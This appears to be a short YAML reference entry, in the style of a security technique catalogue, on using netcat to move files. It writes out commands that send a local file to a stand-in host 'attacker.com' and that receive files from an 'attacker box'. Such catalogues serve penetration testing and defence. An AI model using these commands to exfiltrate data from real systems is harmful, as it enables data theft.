---
functions:
  file-upload:
    - description: Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_send
        nc $RHOST $RPORT < "$LFILE"
  file-download:
    - description: Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file.
      code: |
        LPORT=12345
        LFILE=file_to_save
        nc -l -p $LPORT > "$LFILE"
---
